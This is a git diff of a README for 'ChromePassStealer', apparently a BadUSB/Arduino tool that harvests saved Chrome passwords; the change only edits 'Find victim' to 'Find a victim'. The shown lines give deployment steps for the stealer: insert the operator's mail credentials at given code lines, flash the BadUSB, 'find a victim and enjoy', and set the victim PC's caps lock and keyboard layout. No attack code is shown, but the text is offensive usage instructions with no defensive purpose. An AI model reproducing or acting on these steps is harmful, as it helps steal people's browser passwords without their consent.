@@ -31,7 +31,7 @@ cd ChromePassStealer
 **Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.
 2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.txt) or [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.ino) at line 238, 245, 253, 264
 3. Add your code in the **BadUSB** by **Arduino software**
-4. Find victim and enjoy !
+4. Find a victim and enjoy !
 ## Requirments for victim PC
 * Turn off caps lock
 * Switch the keyboard layout to English
